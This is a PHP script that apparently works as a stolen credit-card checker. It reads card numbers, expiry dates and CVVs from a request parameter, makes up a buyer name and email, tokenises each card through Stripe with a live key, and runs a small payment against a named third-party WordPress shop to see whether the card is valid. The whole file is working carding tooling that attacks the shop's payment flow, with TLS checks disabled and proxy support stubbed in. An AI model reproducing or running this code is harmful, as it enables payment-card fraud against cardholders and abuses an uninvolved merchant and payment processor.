<?php
    
    error_reporting(0);
    
    
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }
    $lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];
    function getStr2($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }
    function dadosnome(){
        $nome = file("lista_nomes.txt");
        $mynome = rand(0, sizeof($nome)-1);
        $nome = $nome[$mynome];
        return $nome;
    }
    function dadossobre(){
        $sobrenome = file("lista_sobrenomes.txt");
        $mysobrenome = rand(0, sizeof($sobrenome)-1);
        $sobrenome = $sobrenome[$mysobrenome];
        return $sobrenome;
    }
    function email($nome){
        $email = preg_replace('<\W+>', "", $nome).rand(0000,9999)."@hotmail.com";
        return $email;
    }
    $nome = dadosnome();
    $sobrenome = dadossobre();
    $email = email($nome);
    $keys = array(1 => 'pk_live_0m7PuMRWIvbun9y3y8s4Gip0');
    $key = array_rand($keys);
    $keyStripe = $keys[$key];



//========================================= POST 1 =====================================


    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                                            

'Host: api.stripe.com',
'accept: application/json',
'accept-encoding: gzip, deflate, br',
'accept-language: en-US,en;q=0.9,pt;q=0.8',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.64',
   

));


curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$nome.'+'.$sobrenome.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fcac019f9f%3B+stripe-js-v3%2Fcac019f9f&time_on_page=30&referrer=https%3A%2F%2Fthecondorandtheeagle.com%2F&key=pk_live_nKCpOMZ8EEXaHdrae2ya2BH300wY5cgENe&_stripe_version=2020-03-02&pasted_fields=number');

$resultadotoken = curl_exec($ch);

 $idtoken = getstr2($resultadotoken,'"tok_','"');





//========================================= POST 2 ======================================


    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://thecondorandtheeagle.com/wp-admin/admin-ajax.php');
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    //curl_setopt($ch, CURLOPT_PROXY, $proxy); 
    //curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(

'Host: thecondorandtheeagle.com',
'accept-encoding: gzip, deflate, br',
'content-type: application/x-www-form-urlencoded',
'origin: https://thecondorandtheeagle.com',
'referer: https://thecondorandtheeagle.com/?asp_action=show_pp&product_id=7835',
'sec-ch-ua: " Not;A Brand";v="99", "Microsoft Edge";v="91", "Chromium";v="91"',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.64',

));


    curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=asp_pp_create_pi&amount=500&curr=BRL&product_id=7835&quantity=1&billing_details={"name":"'.$nome.'"","email":"'.$email.'"}&token=a29f3db6c336116b7721741cb3cd3af1');


 $resultado1 = curl_exec($ch);




$pitoken = getstr2($resultado1, 'pi_id":"','"');


//========================================= POST 3 ======================================


    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://thecondorandtheeagle.com/wp-admin/admin-ajax.php');
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    //curl_setopt($ch, CURLOPT_PROXY, $proxy); 
    //curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookiess.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookiess.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(

'Host: thecondorandtheeagle.com',
'accept-encoding: gzip, deflate, br',
'content-type: application/x-www-form-urlencoded',
'origin: https://thecondorandtheeagle.com',
'referer: https://thecondorandtheeagle.com/?asp_action=show_pp&product_id=7835',
'sec-ch-ua: " Not;A Brand";v="99", "Microsoft Edge";v="91", "Chromium";v="91"',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.64',

));

    curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=asp_pp_confirm_pi&product_id=7835&pi_id='.$pitoken.'&token=a29f3db6c336116b7721741cb3cd3af1&opts={"save_payment_method":true,"setup_future_usage":"off_session","payment_method_data":{"type":"card","card":{"token":"tok_'.$idtoken.'"}}}');



 $resultado2 = curl_exec($ch);

echo "$cc | $mes | $ano | $cvv $resultado2";

?>
